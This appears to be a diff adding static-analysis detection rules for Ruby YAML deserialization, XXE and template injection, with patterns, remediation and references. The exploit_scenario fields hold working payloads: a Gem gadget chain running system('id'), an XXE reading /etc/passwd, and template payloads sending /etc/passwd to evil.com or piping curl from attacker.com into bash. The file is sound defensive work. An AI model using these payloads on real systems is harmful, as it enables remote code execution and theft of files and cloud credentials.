+    pattern: YAML\.load_stream\s*\(\s*(?:params|request|input|user|data)\b
+    description: YAML.load_stream processes multiple YAML documents from user input
+  - type: regex
+    pattern: YAML\.(?:load|parse)\s*\(\s*[a-z_]+\b(?!.*(?:safe_load|permitted_classes))
+    description: YAML.load with a variable argument without safe_load guard in surrounding context
+  anti_patterns:
+  - YAML.safe_load
+  - Psych.safe_load
+  - SafeYAML
+  - 'permitted_classes:'
+  - 'permitted_symbols:'
+  - 'allowed_classes:'
+  - safe_yaml
+  - restrict_classes
+  - YAML.safe_load(
+  - Psych.safe_load(
+  bypass_variants:
+  - description: Using Psych.load with permitted_classes set too broadly, allowing dangerous types
+    pattern: Psych\.load\s*\(.*permitted_classes\s*:\s*\[.*(?:ERB|OpenStruct|Gem::Installer|Gem::Requirement)\b
+  - description: Deserializing YAML from a database column or cache that was populated with user input
+    pattern: YAML\.load\s*\(\s*(?:[a-z_]+\.(?:body|content|payload|data|value))\b
+  evasion_indicators:
+  - '!ruby/object:'
+  - '!ruby/hash:'
+  - '!ruby/struct:'
+  - Gem::Installer
+  - Gem::Requirement
+  - ERB
+  encoding_variants:
+  - type: base64_encoding
+    pattern: YAML\.load\s*\(\s*Base64\.decode64\s*\(\s*(?:params|request|input)\b
+  - type: url_encoding
+    pattern: YAML\.load\s*\(\s*(?:CGI|URI)\.(?:unescape|decode)\s*\(\s*(?:params|request)\b
+  - type: gzip_compression
+    pattern: YAML\.load\s*\(\s*(?:Zlib::Inflate|Zlib\.inflate|ActiveSupport::Gzip)\.(?:inflate|decompress)\s*\(\s*(?:params|request)\b
+  multi_function_chain_patterns:
+  - request\.body\.read.*YAML\.load
+  - params\[.*\].*YAML\.load\s*\(
+  - File\.read\(.*params.*\).*YAML\.load
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Remote code execution via crafted YAML payload containing Ruby object instantiation directives, no
+      authentication required if endpoint accepts YAML input
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: params[:config] or request.body.read
+    sink: YAML.load(user_yaml_string)
+    through: Controller action or API endpoint that accepts YAML-formatted configuration or data import
+  - source: File upload (multipart form data)
+    sink: YAML.load(File.read(uploaded_file.path))
+    through: File upload handler that reads and parses uploaded YAML files
+  impact: 'YAML deserialization in Ruby (via Psych engine) can instantiate arbitrary Ruby
+
+    objects by processing YAML tags like !ruby/object:ClassName. Attackers can craft
+
+    YAML payloads that chain gadget objects (such as Gem::Installer, Gem::Requirement,
+
+    ERB, or Gem::StubSpecification) to achieve remote code execution. Known exploit
+
+    chains exist for every major Ruby version. A single YAML.load call on untrusted
+
+    input can lead to complete server compromise, including arbitrary file read/write,
+
+    command execution, reverse shells, and denial of service. This vulnerability class
+
+    has been exploited in major real-world breaches against Ruby on Rails applications.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Ruby 3.1+: YAML.load now requires permitted_classes by default\n      YAML.safe_load(yaml_string)\n\
+    \      YAML.safe_load(yaml_string, permitted_classes: [Date, Time, Symbol])\n  - Ruby < 3.1: replace all YAML.load with\
+    \ YAML.safe_load\n      YAML.safe_load(params[:data])\n  - Rails: use ActiveSupport JSON serialization instead of YAML\
+    \ for user data\n      config = JSON.parse(params[:config])\n  - Psych: use Psych.safe_load with strict class restrictions\n\
+    \      Psych.safe_load(data, permitted_classes: [Date, Time])\nSecure libraries:\n  - YAML.safe_load (built-in, restricts\
+    \ object instantiation)\n  - SafeYAML gem (monkey-patches YAML.load for safety)\n  - Psych.safe_load with permitted_classes\
+    \ whitelist\n  - JSON as a safer serialization alternative for user data\nPrevention strategies:\n  - Replace every YAML.load\
+    \ call with YAML.safe_load globally\n  - Use SafeYAML gem to make YAML.load safe by default across the application\n \
+    \ - Never accept YAML input from untrusted sources; prefer JSON for APIs\n  - If YAML is required, use permitted_classes\
+    \ with the minimal set of safe types\n  - Audit gems and dependencies for internal YAML.load usage on user-controlled\
+    \ data\n  - Add Brakeman deserialization checks to CI/CD pipeline\n  - Monitor for YAML payloads containing !ruby/object\
+    \ tags in WAF rules\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/502.html
+  - https://blog.rubygems.org/2013/01/31/data-verification.html
+  - https://ruby-doc.org/stdlib/libdoc/yaml/rdoc/YAML.html
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - class.*<.*ActionController::API
+    - require.*yaml
+    - require.*psych
+    - class.*Service
+    - class.*Importer
+    - class.*Parser
+    - def upload
+    - def import
+    taint_source_indicators:
+    - params[
+    - request.body
+    - request.raw_post
+    - request.body.read
+    - File.read(
+    - IO.read(
+    - uploaded_file
+    - tempfile
+    - cookies[
+    taint_sink_indicators:
+    - YAML.load(
+    - Psych.load(
+    - Psych.unsafe_load(
+    - YAML.load_stream(
+    - YAML.load_file(
+    - Psych.load_stream(
+    - YAML.parse(
+    sanitization_patterns:
+    - YAML.safe_load
+    - Psych.safe_load
+    - SafeYAML
+    - 'permitted_classes:'
+    - 'allowed_classes:'
+    - safe_yaml
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + gadget_chain_availability + network_exposure)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Rails API endpoint accepts YAML configuration uploads and parses them with YAML.load(request.body.read).
+      An attacker submits a crafted YAML document containing a !ruby/object:Gem::Installer gadget chain that writes a web
+      shell to the public directory, then executes arbitrary commands on the server. The payload uses nested object instantiation
+      to chain from Gem::Requirement through Gem::StubSpecification to achieve file write and command execution.
+
+      '
+    example_payload: '--- !ruby/object:Gem::Installer i: x
+
+      --- !ruby/object:Gem::SpecFetcher i: y
+
+      --- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: abc debug_output: &1 !ruby/object:Net::WriteAdapter
+      socket: &1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module Kernel git_set: system(''id'')'
+    attacker_objective: Achieve remote code execution via Ruby object deserialization gadget chains to compromise the server,
+      exfiltrate secrets, install backdoors, or pivot into internal infrastructure.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RUBY-INJ-003
+    - RUBY-INJ-002
+    - RUBY-INJ-007
+- rule_id: RUBY-INJ-007
+  title: XML External Entity Injection via Nokogiri/REXML
+  description: 'Detects XML parsing in Ruby applications using Nokogiri or REXML with external entity processing enabled,
+    allowing attackers to read arbitrary files from the server, perform server-side request forgery, exfiltrate data via out-of-band
+    channels, or cause denial of service through recursive entity expansion (Billion Laughs attack).
+
+    '
+  language: ruby
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-611
+  owasp: A05:2021-Security Misconfiguration
+  tags:
+  - xxe
+  - xml-injection
+  - nokogiri
+  - rexml
+  - ssrf
+  - file-disclosure
+  - entity-expansion
+  detection_layer: 3
+  attack_surface_type: XML parsing endpoint
+  patterns:
+  - type: regex
+    pattern: Nokogiri::XML\s*\(\s*(?:params|request|input|user|data|body)\b
+    description: Nokogiri XML parsing of user-controlled input with default entity processing
+  - type: regex
+    pattern: Nokogiri::XML\s*\(\s*(?:request\.body|request\.raw_post)\b
+    description: Nokogiri parsing the raw HTTP request body as XML
+  - type: regex
+    pattern: REXML::Document\.new\s*\(\s*(?:params|request|input|user|data|body)\b
+    description: REXML document construction from user input with default XXE-vulnerable settings
+  - type: regex
+    pattern: Nokogiri::XML\s*\(.*\)\s*(?:do|\{)(?:(?!nonet|NONET|NOENT).)*$
+    description: Nokogiri XML parsing without NONET or NOENT flags in the block configuration
+  - type: regex
+    pattern: LibXML::XML::Parser\.(?:string|io|file)\s*\(\s*(?:params|request|input|user)\b
+    description: LibXML parser invoked on user-controlled input
+  - type: regex
+    pattern: Nokogiri::(?:XML|HTML)\.parse\s*\(\s*(?:params|request|input|user|data)\b
+    description: Nokogiri parse method with user-controlled input
+  - type: regex
+    pattern: REXML::Document\.new\s*\(\s*(?:File\.read|IO\.read|open)\s*\(\s*(?:params|request|input)\b
+    description: REXML parsing a file at a user-controlled path
+  anti_patterns:
+  - NONET
+  - NOENT
+  - Nokogiri::XML::ParseOptions::NONET
+  - Nokogiri::XML::ParseOptions::NOENT
+  - DTDLOAD
+  - entity_expansion_text_limit
+  - entity_expansion_limit
+  - REXML::Security
+  - noko.parse(xml) { |config| config.nonet
+  - noblanks.nonet
+  bypass_variants:
+  - description: Using parameter entity references instead of general entities to bypass WAF filters
+    pattern: Nokogiri::XML\s*\(.*(?:%[a-zA-Z]+;|SYSTEM\s+['"](?:file|http|ftp|expect|php))
+  - description: Out-of-band XXE using external DTD to exfiltrate data when direct entity rendering is blocked
+    pattern: Nokogiri::XML\s*\(.*(?:<!ENTITY.*SYSTEM|<!DOCTYPE.*\[)
+  evasion_indicators:
+  - <!ENTITY
+  - <!DOCTYPE
+  - SYSTEM
+  - PUBLIC
+  - '%xxe;'
+  - file:///
+  - expect://
+  encoding_variants:
+  - type: utf16_encoding
+    pattern: Nokogiri::XML\s*\(.*(?:encode|force_encoding)\s*\(\s*['"]UTF-16
+  - type: base64_encoding
+    pattern: Nokogiri::XML\s*\(\s*Base64\.decode64\s*\(\s*(?:params|request)\b
+  multi_function_chain_patterns:
+  - request\.body\.read.*Nokogiri::XML\s*\(
+  - params\[.*\].*REXML::Document\.new\s*\(
+  - File\.read\(.*params.*\).*Nokogiri::XML
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Server-side file disclosure and SSRF via XXE, potentially reading /etc/passwd, AWS metadata endpoints,
+      or internal service credentials without authentication
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.body.read or params[:xml]
+    sink: Nokogiri::XML(xml_string) or REXML::Document.new(xml_string)
+    through: API endpoint accepting XML content-type (application/xml, text/xml) or file upload handler
+  - source: uploaded XML file via multipart form
+    sink: Nokogiri::XML(File.read(uploaded_file.path))
+    through: Document import or data exchange feature that processes uploaded XML files
+  impact: 'XML External Entity injection allows attackers to define external entities in
+
+    XML documents that reference local files (file:///etc/passwd), internal network
+
+    services (http://169.254.169.254/latest/meta-data/), or remote DTDs for out-of-band
+
+    data exfiltration. In Ruby applications using Nokogiri (libxml2 backend) or REXML,
+
+    the impact includes: arbitrary file read from the server filesystem, server-side
+
+    request forgery (SSRF) to internal services and cloud metadata endpoints, denial
+
+    of service via recursive entity expansion (Billion Laughs), and port scanning of
+
+    internal networks. On cloud-hosted applications, XXE can access instance metadata
+
+    services to steal IAM credentials, leading to full cloud account compromise.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Nokogiri: disable external entity loading with NONET and NOENT flags\n    \
+    \  doc = Nokogiri::XML(xml_string) { |config|\n        config.nonet.noent.noblanks\n      }\n  - Nokogiri: use parse options\
+    \ constant\n      doc = Nokogiri::XML(xml_string, nil, nil,\n        Nokogiri::XML::ParseOptions::NONET |\n        Nokogiri::XML::ParseOptions::NOENT)\n\
+    \  - REXML: set entity expansion limits\n      REXML::Security.entity_expansion_limit = 0\n      REXML::Security.entity_expansion_text_limit\
+    \ = 0\n      doc = REXML::Document.new(xml_string)\n  - Rails: configure global XML parsing in application.rb\n      config.middleware.delete\
+    \ ActionDispatch::ParamsParser\nSecure libraries:\n  - Nokogiri with NONET | NOENT parse options (default safe in Nokogiri\
+    \ >= 1.13.2)\n  - Oga gem (pure Ruby XML parser without external entity support)\n  - ox gem with default safe parsing\
+    \ configuration\n  - JSON as alternative format where XML is not strictly required\nPrevention strategies:\n  - Always\
+    \ disable external entity processing in XML parsers\n  - Set Nokogiri parse options to NONET | NOENT for all XML parsing\n\
+    \  - Set REXML::Security.entity_expansion_limit = 0 globally\n  - Prefer JSON over XML for API communication where possible\n\
+    \  - Validate XML content-type headers and reject unexpected XML input\n  - Use Web Application Firewall rules to detect\
+    \ XXE payloads (<!ENTITY, SYSTEM)\n  - Audit all XML parsing code paths including those in gem dependencies\n  - On cloud\
+    \ deployments, restrict access to metadata endpoints via network policy\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/611.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+  - https://nokogiri.org/tutorials/security.html
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - class.*<.*ActionController::API
+    - require.*nokogiri
+    - require.*rexml
+    - class.*Parser
+    - class.*Importer
+    - class.*XmlService
+    - def parse
+    - def import
+    - content_type.*xml
+    taint_source_indicators:
+    - params[
+    - request.body
+    - request.raw_post
+    - request.body.read
+    - File.read(
+    - IO.read(
+    - uploaded_file
+    - tempfile
+    - open(
+    taint_sink_indicators:
+    - Nokogiri::XML(
+    - Nokogiri::XML.parse(
+    - Nokogiri::HTML(
+    - REXML::Document.new(
+    - LibXML::XML::Parser
+    - Nokogiri::XML::SAX::Parser
+    - Nokogiri::XML::Reader(
+    sanitization_patterns:
+    - nonet
+    - NONET
+    - noent
+    - NOENT
+    - entity_expansion_limit
+    - entity_expansion_text_limit
+    - ParseOptions::NONET
+    - config.nonet
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 + file_read_impact + ssrf_factor + cloud_metadata_exposure)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Rails API endpoint accepts XML-formatted data imports via POST /api/import and parses them with Nokogiri::XML(request.body.read)
+      without disabling entity processing. An attacker sends a crafted XML document containing an external entity definition
+      that references file:///etc/passwd and includes the entity in a data field, causing the server to read the local passwd
+      file and include its contents in the parsed XML output or error response. On AWS, the attacker targets http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      to steal IAM role credentials.
+
+      '
+    example_payload: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><data>&xxe;</data>
+    attacker_objective: Read arbitrary server files, access cloud metadata endpoints to steal IAM credentials, perform SSRF
+      against internal services, or cause denial of service via entity expansion bombs.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RUBY-INJ-006
+    - RUBY-INJ-001
+    - RUBY-INJ-002
+- rule_id: RUBY-INJ-008
+  title: Server-Side Template Injection via Liquid/Slim/Haml
+  description: 'Detects server-side template injection vulnerabilities where user-controlled input is rendered through Ruby
+    templating engines such as Liquid, Slim, Haml, or Tilt without proper sandboxing. Attackers can inject template directives
+    to execute arbitrary Ruby code, access application objects, read environment variables, or traverse the object graph to
+    achieve remote code execution.
+
+    '
+  language: ruby
+  category: injection
+  severity: High
+  confidence: 0.89
+  cwe: CWE-94
+  owasp: A03:2021-Injection
+  tags:
+  - ssti
+  - template-injection
+  - liquid
+  - slim
+  - haml
+  - tilt
+  - rce
+  - code-injection
+  detection_layer: 3
+  attack_surface_type: Template rendering endpoint
+  patterns:
+  - type: regex
+    pattern: Liquid::Template\.parse\s*\(\s*(?:params|request|input|user|data)\b
+    description: Liquid template parsed from user-controlled input allowing tag injection
+  - type: regex
+    pattern: Slim::Template\.new\s*\(\s*(?:params|request|input|user|data)\b
+    description: Slim template instantiated with user input enabling Ruby code execution via interpolation
+  - type: regex
+    pattern: Haml::Engine\.new\s*\(\s*(?:params|request|input|user|data)\b
+    description: Haml engine rendering user-controlled template with embedded Ruby evaluation
+  - type: regex
+    pattern: Tilt\.new\s*\(\s*(?:params|request|input|user|data)\b
+    description: Tilt generic template engine with user-controlled template source
+  - type: regex
+    pattern: render\s+inline\s*:\s*(?:params|request|input|user|data)\b
+    description: Rails render inline with user input, directly evaluating template contents
+  - type: regex
+    pattern: Tilt\[.*\]\.new\s*\(\s*(?:params|request|input|user|data)\b
+    description: Tilt engine lookup with user-controlled template type and content
+  - type: regex
+    pattern: Mustache\.render\s*\(\s*(?:params|request|input|user|data)\b
+    description: Mustache rendering with user-controlled template string
+  - type: regex
+    pattern: render\s*\(\s*(?:text|html|body)\s*:\s*(?:params|request|input|user|data)\b
+    description: Rails render with user-controlled content body that may include template directives
+  anti_patterns:
+  - Liquid::Template.parse(File.read
+  - 'render template:'
+  - 'render partial:'
+  - 'render file:'
+  - 'render action:'
+  - Erubi
+  - sanitize
+  - escape_html
+  - Liquid::Template.register_filter
+  - Liquid::C.parse
+  bypass_variants:
+  - description: Injecting Liquid tags that access the forloop or tablerow objects to leak data
+    pattern: Liquid::Template\.parse\s*\(.*(?:\{\%|\{\{).*(?:forloop|tablerow|assign|capture|include)\b
+  - description: Chaining Slim/Haml string interpolation to break out of template context into Ruby execution
+    pattern: (?:Slim|Haml)::(?:Template|Engine)\.new\s*\(.*#\{.*(?:system|exec|eval|File|IO|Kernel)\b
+  - description: Using Tilt with user-controlled engine type to force evaluation through a dangerous engine
+    pattern: Tilt\[\s*(?:params|request|input)\b.*\]\.new
+  evasion_indicators:
+  - '{{ self }}'
+  - '{% raw %}'
+  - '{{ ''''.__class__ }}'
+  - '#{ system('
+  - = `
+  - '- eval('
+  - '#{`id`}'
+  encoding_variants:
+  - type: html_entity_encoding
+    pattern: (?:Liquid|Slim|Haml).*(?:&#x7b;|&#123;|&lcub;).*(?:params|request|input)\b
+  - type: unicode_escape
+    pattern: (?:Liquid|Slim|Haml).*(?:\\u007b|\\x7b).*(?:params|request|input)\b
+  multi_function_chain_patterns:
+  - params\[.*\].*Liquid::Template\.parse\s*\(.*\.render
+  - request\.body\.read.*(?:Slim|Haml|Tilt).*\.render
+  - 'params\[.*template.*\].*render\s+inline:'
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Remote code execution via template injection allowing access to Ruby runtime, environment variables,
+      application secrets, and OS command execution
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: params[:template] or params[:content]
+    sink: 'Liquid::Template.parse(user_template).render or render inline: user_template'
+    through: CMS page editor, email template customization, or dynamic content rendering feature
+  - source: Database column containing user-submitted template content
+    sink: Slim::Template.new { user_stored_template }.render
+    through: Admin customization panel where templates are stored in database and rendered server-side
+  impact: 'Server-side template injection in Ruby applications allows attackers to inject
+
+    template directives that are executed on the server. The severity depends on the
+
+    templating engine: Liquid provides a sandboxed environment but custom tags and
+
+    filters can leak data or enable denial of service; Slim and Haml allow embedded
+
+    Ruby code execution by design, meaning any user-controlled template leads directly
+
+    to RCE; Tilt dispatches to multiple engines and user-controlled engine selection
+
+    can escalate from safe to dangerous template evaluation. Successful exploitation
+
+    enables arbitrary code execution, access to application secrets and environment
+
+    variables (including database credentials, API keys), full filesystem access,
+
+    and lateral movement to connected services and databases.
+
+    '
+  remediation: "Framework-specific fixes:\n  - Rails: never use render inline: with user input; use pre-defined templates\n\
+    \      render template: \"pages/show\"\n      render partial: \"shared/content\", locals: { content: sanitized_content\
+    \ }\n  - Liquid: use strict mode and restrict available filters/tags\n      template = Liquid::Template.parse(content)\n\
+    \      template.render({}, strict_variables: true, strict_filters: true)\n  - Slim/Haml: never parse user-controlled strings\
+    \ as templates\n      # Instead of Slim::Template.new { params[:content] }.render\n      # Use pre-compiled templates\
+    \ with safe variable interpolation\n  - Tilt: never allow user-controlled engine type selection\n      # Never: Tilt[params[:format]].new\
+    \ { content }.render\n      # Always: use a fixed, known-safe engine\nSecure libraries:\n  - Liquid with strict mode (sandboxed,\
+    \ limited to safe operations)\n  - Mustache (logic-less templating, no code execution)\n  - Rails ActionView with pre-compiled\
+    \ templates (ERB/Erubi from files only)\n  - Markdown renderers (Redcarpet, Kramdown) for user-formatted content\nPrevention\
+    \ strategies:\n  - Never allow user input to be used as template source in any engine\n  - Use Liquid in strict mode for\
+    \ user-customizable templates with curated filters\n  - Pre-compile all templates from trusted filesystem sources only\n\
+    \  - Implement Content Security Policy headers to limit template output behavior\n  - Separate user-customizable content\
+    \ from template logic using a WYSIWYG editor or Markdown\n  - Audit all render calls in controllers for inline or dynamic\
+    \ template usage\n  - Use Brakeman render checks and template injection detection in CI/CD\n  - If user-customizable email\
+    \ templates are required, use Liquid with a strict allowlist of variables\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/94.html
+  - https://portswigger.net/research/server-side-template-injection
+  - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - class.*<.*ApplicationController
+    - class.*<.*ActionController::Base
+    - require.*liquid
+    - require.*slim
+    - require.*haml
+    - require.*tilt
+    - class.*Mailer
+    - class.*CmsController
+    - class.*TemplateService
+    - def render_custom
+    - def preview
+    taint_source_indicators:
+    - params[:template]
+    - params[:content]
+    - params[:body]
+    - params[:layout]
+    - params[:format]
+    - request.body
+    - request.raw_post
+    - cookies[
+    - session[
+    - database_record.template_body
+    taint_sink_indicators:
+    - Liquid::Template.parse(
+    - Slim::Template.new(
+    - Haml::Engine.new(
+    - Tilt.new(
+    - Tilt[].new(
+    - 'render inline:'
+    - 'render text:'
+    - 'render html:'
+    - Mustache.render(
+    - .render(
+    sanitization_patterns:
+    - 'strict_variables: true'
+    - 'strict_filters: true'
+    - Liquid::Template.register_tag
+    - escape_html
+    - sanitize(
+    - 'render template:'
+    - 'render partial:'
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (1 + engine_power_factor + sandbox_escape_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A SaaS application allows users to customize notification email templates using a WYSIWYG editor that
+      stores templates in the database. The application renders these templates server-side using Slim::Template.new { stored_template
+      }.render. An attacker edits their template source (via API or by intercepting the form submission) to include = `cat
+      /etc/passwd` or #{ system(''curl attacker.com/shell|bash'') }, which Slim evaluates as Ruby code during rendering. This
+      grants the attacker remote code execution every time the notification is sent.
+
+      '
+    example_payload: = system('curl http://evil.com/exfil?data=' + File.read('/etc/passwd').gsub("\n",","))
+    attacker_objective: Execute arbitrary Ruby code on the server to steal application secrets, read the filesystem, establish
+      reverse shells, or compromise connected services and databases.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - RUBY-INJ-003
+    - RUBY-INJ-006
+    - RUBY-INJ-002
